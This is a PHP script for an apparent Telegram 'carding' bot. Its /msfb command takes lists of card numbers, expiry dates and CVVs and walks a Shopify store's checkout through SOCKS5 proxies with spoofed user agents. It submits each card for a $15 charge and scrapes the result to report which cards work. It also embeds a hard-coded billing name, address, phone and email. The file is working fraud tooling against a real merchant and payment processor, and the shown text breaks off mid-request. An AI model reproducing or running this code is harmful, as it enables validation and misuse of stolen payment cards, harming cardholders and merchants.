<?php

$url = 'https://api.telegram.org/bot'.$bot_token.'/deleteMessage';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
  'message_id' => $message_idd ));
    $response = sendAsyncRequest($url, $data);

if ($text == 'msfb') {
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "𝐆𝐚𝐭𝐞 𝐈𝐧𝐟𝐨 - <b>\n• Shopify+Braintree Mass 15$ Charge - /msfb \n• Other Gates - /cmds </b> ",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

include 'Tools/Antispam.php';

$file = 'file.txt';
unlink($file);

$data = substr($text, 5);
$lista = explode("\n", $data);
$numcc = count($lista);
$credits_file = file_get_contents('Tools/Credits.txt');
$credits_lines = explode("\n", $credits_file);
foreach ($credits_lines as $line) {
  if (strpos($line, $userId) === 0) {
    $user_credits = intval(substr($line, strlen($userId) + 1));
    break;
  }
}
if ($user_credits < $numcc) { $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
            $data = http_build_query(array(
                'chat_id' => $chat_id,
                'message_id' => $message_idd,
                'text' => "𝐃𝐞𝐚𝐫 <b><a href='tg://user?id=$userId'>$username</a></b> 𝐘𝐨𝐮 𝐃𝐨𝐧'𝐭 𝐇𝐚𝐯𝐞 𝐒𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝",
                'parse_mode' => 'HTML'
            ));
            $response = sendAsyncRequest($url, $data);exit();}

$checkedCards = 0;
foreach ($lista as $cards) {
    if ($numcc > 10) {$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝐘𝐎𝐔 𝐂𝐀𝐍𝐍𝐎𝐓 𝐂𝐇𝐄𝐂𝐊 𝐌𝐎𝐑𝐄 𝐓𝐇𝐀𝐍 10 𝐂𝐂 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();}

$i = explode("|", $cards);
$cc = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon = $i[1];
$year = $i[2];
$cvv = $i[3];

if (number_format($mon) < 10){$mon = str_replace("0", "", $mon);};

if(strlen($year) == 2){
($year = "20"."$year");
};

if ( empty($cc) or empty($mon) or empty($year) or empty($cvv) ) 
{$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "<b>⚠ [𝑨𝑳𝑬𝑹𝑻] 𝑷𝑳𝑬𝑨𝑺𝑬 𝑪𝑯𝑬𝑪𝑲 𝑻𝑯𝑬 𝑰𝑵𝑷𝑼𝑻 𝑭𝑰𝑬𝑳𝑫𝑺 𝑨𝑵𝑫 𝑻𝑹𝒀 𝑨𝑮𝑨𝑰𝑵 - 𝑻𝒆𝒙𝒕 𝑺𝒉𝒐𝒖𝒍𝒅 𝑶𝒏𝒍𝒚 𝑪𝒐𝒏𝒕𝒂𝒊𝒏 𝒄𝒄 𝒎𝒐𝒏 𝒚𝒆𝒂𝒓 𝒄𝒗𝒗 </b>",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
  
$max_retries = 3;
$retry_count = 0;
  
#01. Req
$ch = curl_init();
do {include 'Tools/Proxy.php';
curl_setopt($ch, CURLOPT_URL, 'https://www.mychoicesoftware.com/cart/22820646535:1?traffic_source=buy_now');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
$curl1 = curl_exec($ch);
$redirect = curl_getinfo($ch)['redirect_url'];
$redirect2 = trim(strip_tags(getStr($redirect,'https://www.mychoicesoftware','?')));
$urll = "https://www.mychoicesoftware$redirect2";
curl_close($ch);
$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
 if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
  
#02. Req
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, ''.$redirect.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$curl2 = curl_exec($ch);
$autht1 = trim(strip_tags(getStr($curl2,'name="authenticity_token" value="','"')));
curl_close($ch);
sleep(1);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

# 03 Req..
$ch = curl_init();
  do {
curl_setopt($ch, CURLOPT_URL, ''.$urll.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://www.mychoicesoftware.com',
'referer: '.$urll.'?traffic_source=buy_now',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht1.'&previous_step=contact_information&step=payment_method&checkout%5Bemail%5D=abhays32109%40gmail.com&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Battributes%5D%5BSales+Person%5D=&checkout%5Battributes%5D%5BPO+Number%5D=&checkout%5Bbilling_address%5D%5Bfirst_name%5D=&checkout%5Bbilling_address%5D%5Blast_name%5D=&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=&checkout%5Bbilling_address%5D%5Bprovince%5D=&checkout%5Bbilling_address%5D%5Bzip%5D=&checkout%5Bbilling_address%5D%5Bphone%5D=&checkout%5Bbilling_address%5D%5Bcountry%5D=United+States&checkout%5Bbilling_address%5D%5Bfirst_name%5D=ajay&checkout%5Bbilling_address%5D%5Blast_name%5D=singh&checkout%5Bbilling_address%5D%5Bcompany%5D=&checkout%5Bbilling_address%5D%5Baddress1%5D=6767+Gardenia+Drive&checkout%5Bbilling_address%5D%5Baddress2%5D=&checkout%5Bbilling_address%5D%5Bcity%5D=Palm+Beach+Gardens&checkout%5Bbilling_address%5D%5Bprovince%5D=FL&checkout%5Bbilling_address%5D%5Bzip%5D=33410&checkout%5Bbilling_address%5D%5Bphone%5D=%28425%29+552-6333&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1024&checkout%5Bclient_details%5D%5Bbrowser_height%5D=1292&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=32&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=0');
$curl3 = curl_exec($ch);
curl_close($ch);
sleep(1);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

#04. Req
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, ''.$urll.'?previous_step=contact_information&step=payment_method');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$curl4 = curl_exec($ch);
$autht2 = trim(strip_tags(getStr($curl4,'name="authenticity_token" value="','"')));
curl_close($ch);
sleep(1);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
  
# 05 Req..
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, 'https://deposit.us.shopifycs.com/sessions');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/json',
'Host: deposit.us.shopifycs.com',
'Origin: https://checkout.shopifycs.com',
'Referer: https://checkout.shopifycs.com/',
'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"credit_card":{"number":"'.$c1.' '.$c2.' '.$c3.' '.$c4.'","name":"ajay singh","month":'.$mon.',"year":'.$year.',"verification_value":"'.$cvv.'"},"payment_session_scope":"www.mychoicesoftware.com"}');

$curl5 = curl_exec($ch);
$pid = trim(strip_tags(getStr($curl5,'id":"','"')));
curl_close($ch);
sleep(1);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

# 06 Req..
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, ''.$urll.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '_method=patch&authenticity_token='.$autht2.'&previous_step=payment_method&step=&s='.$pid.'&checkout%5Bpayment_gateway%5D=19162241&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Btotal_price%5D=1500&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1024&checkout%5Bclient_details%5D%5Bbrowser_height%5D=1292&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=32&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=0');
$curl6 = curl_exec($ch);
curl_close($ch);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

#07. Req
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, ''.$urll.'/processing');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$curl7 = curl_exec($ch);
curl_close($ch);
sleep(1);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

#8. Req
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, ''.$urll.'/processing?from_processing_page=1');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$curl8 = curl_exec($ch);
$rspppppp = trim(strip_tags(getStr($curl8,'</svg><div class="notice__content"><p class="notice__text">','</p>')));
curl_close($ch);

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

#9. Req
$ch = curl_init();
do {
curl_setopt($ch, CURLOPT_URL, ''.$urll.'?from_processing_page=1&validate=true');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/Tools/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/Tools/cookie.txt');
$curl9 = curl_exec($ch);
print_r ($curl9);
$rsppppp = trim(strip_tags(getStr($curl9,'</svg><div class="notice__content"><p class="notice__text">','</p>')));

$response_code = curl_getinfo($ch, CURLINFO_RESPONSE_CODE);
if ($response_code == 0 || $response_code > 400) { $retry_count++; } else {break;}

  $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙍𝙚𝙩𝙧𝙮𝙞𝙣𝙜 𝘾𝙤𝙪𝙣𝙩 $retry_count ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);
  
} while ($retry_count < $max_retries);
if ($retry_count === $max_retries) {
    $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙏𝘼𝙏𝙐𝙎 - 𝙈𝙖𝙭 𝙍𝙚𝙩𝙧𝙞𝙚𝙨 𝙋𝙧𝙤𝙘𝙚𝙨𝙨 𝙎𝙩𝙤𝙥𝙥𝙚𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

curl_close($ch);
  
#10. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, ''.$urll.'/thank_you');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
